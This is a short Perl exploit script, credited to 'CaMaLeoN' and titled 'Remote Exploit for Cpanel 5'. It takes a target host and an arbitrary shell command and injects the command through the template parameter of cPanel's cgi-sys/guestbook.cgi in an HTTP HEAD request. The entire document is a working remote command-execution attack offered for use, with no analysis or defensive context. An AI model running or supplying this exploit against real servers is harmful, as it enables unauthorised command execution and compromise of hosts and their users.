#!usr/bin/perl
use LWP::UserAgent
print "##########################################\n";
print "#                                        #\n";
print "#      Remote Exploit for Cpanel 5       #\n";
print "#                                        #\n";
print "##########################################\n";
print "                           C0d3r: CaMaLeoN\n";
die "Use: $0 <host> <command>\n" unless ($ARGV[1]);
$web=$ARGV[0];
$comando=$ARGV[1];
$fallos="cgi-sys/guestbook.cgi?user=cpanel&template=$comando";
$url="http://$web/$fallos";
$ua = LWP::UserAgent->new();
$request = HTTP::Request->new('HEAD', $url);
$response = $ua->request($request);
if ($response->code == 200){
                            print "Command sent.\n";
                           }
                           else
                           {
                            print "The command could not be sent.\n";
                           } 
